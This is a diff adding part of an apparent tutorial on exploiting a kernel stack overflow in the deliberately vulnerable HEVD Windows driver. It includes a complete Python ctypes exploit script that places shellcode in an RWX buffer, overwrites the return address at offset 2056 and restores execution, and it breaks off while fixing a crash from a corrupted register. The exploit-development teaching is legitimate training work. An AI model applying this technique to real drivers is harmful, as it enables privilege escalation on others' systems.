@@ -114,4 +114,114 @@ You can see as we hit our breakpoint for `TriggerStackOverflow` and step through
 
 ![](/assets/images/AWE/crash64.PNG)
 
-And as you can see, we crashed. 
+And as you can see, we crashed. Not only did we write a bunch of values to the stack, we obviously overwrote a bunch of values in registers. We control a lot of registers here. This can be a bad thing in the kernel since we want to be very specific about what memory we corrupt. I'll leave you to finding the offset we need to control this `ret` address :).
+
+## Starting our Exploit
+Alright, now let's do what we did last time. Let's send through the perfect buffer length to step through the function and see what instructions execute after we return from `TriggerStackOverflow`. Without overflowing the buffer, we would follow this path of execution:
+
+![](/assets/images/AWE/return.PNG)
+
+As you can see, when we `ret` out of `TriggerStackOverflow` and re-enter `StackOverflowIoctlHandler`, we execute:
++ `add rsp, 0x28`, and
++ `ret`
+
+Our shellcode will need to simulate these commands in order for us to restore execution as intended and not crash the box. To summarize, our execution paths look like this:
+
+#### No Overflow
+`StackOverflowIoctlHandler` --> `TriggerStackOverflow` --> `ret` to `StackOverflowIoctlHandler` then `add rsp, 0x28` then `ret` to --> `IrpDeviceIoCtlHandler`
+
+#### With Overflow
+
+`StackOverflowIoctlHandler` --> `TriggerStackOverflow` --> `ret` to shellcode then `add rsp, 0x28` then `ret` to --> `IrpDeviceIoCtlHandler`
+
+All we really did is substitute our shellcode for the end of `StackOverflowIoctlHandler` and then run that function's commands at the end of our shellcode to restore execution. Let's add some shellcode to our script, use `VirtualAlloc` to mark it with RWX permissions, and send some NOPs along with our restoration stub and everything should work out well! Also, you'll see the offset here to overwrite the `ret` address is `2056`. Spoiler alert. 
+
+Our exploit code now looks like this:
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+import time
+
+kernel32 = windll.kernel32
+
+hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+if (not hevd) or (hevd == -1):
+    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+    sys.exit(1)
+else:
+    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+shellcode1 = (
+"\x90" * 100                                               
+)
+
+restoration_stub = (
+"\x48\x83\xc4\x28"               # add rsp,0x28
+"\xc3"                           # ret
+)
+
+shellcode = shellcode1 + restoration_stub
+
+addr = kernel32.VirtualAlloc(
+    c_int64(0),
+    c_int(len(shellcode)),
+    c_int(0x3000),
+    c_int(0x40)
+)
+
+if not addr:
+    print("[!] Error allocating shellcode RWX buffer")
+else:
+    print("[*] Allocated RWX buffer for shellcode @ {}").format(str(hex(addr)))
+
+memmove(addr,shellcode,len(shellcode))
+
+addr = struct.pack("<Q", addr)
+
+buf = create_string_buffer("A"*2048 + "B"*8 + addr)
+
+result = kernel32.DeviceIoControl(
+    hevd,
+    0x222003,
+    addressof(buf),
+    (len(buf)-1),
+    None,
+    0,
+    byref(c_ulong()),
+    None
+)
+
+if result != 0:
+        print("[*] Sending payload to driver...")
+else:
+    print("[!] Unable to send payload to driver.")
+    sys.exit(1)
+```
+
+There are some details that need explaining here. We use the `ctypes` function `memmove` here to move our shellcode into the RWX buffer we create with `VirtualAlloc`. You can read about `memmove` [here](https://docs.python.org/2/library/ctypes.html).
+
+Another big point of emphasis is the fact that in order to format the pointer to our shellcode buffer correctly, we had to use `struct.pack("<Q",addr)` which formats our pointer as an `unsigned long long` type variable in C and an 8 byte `int` in Python. You can read about all the different typing conversions for `struct.pack` [here](https://docs.python.org/2/library/struct.html). 
+
+Since we restored execution, and we're just using NOPs, this should sail through no problem!
+
+![](/assets/images/AWE/damn.PNG)
+
+Oops! We actually died. We died inside `IrpDeviceIoCtlHandler`. So we def ran our shellcode and then died on this operation here:
+
+![](/assets/images/AWE/unexpected.PNG)
+
+As you can see, we were doing an `and qword ptr [rdi+38h]`. The reason we died there, is because our `B` chars we sent had overwritten `rdi` and `0x4242424242424242` plus `0x38` is not a valid memory space so we crash. So we can't have RDI holding `0x4242424242424242` when we exit our shellcode. We'll have to restore it what it was supposed to be before we corrupted it.
+
+## Correct Restoration, Final Exploit
+The only way I know how to restore RDI to what it's suppsoed to be, is to see when we run the exploit without an overflow, what the offset is between RDI and another register right before we enter our shellcode. 
+
+
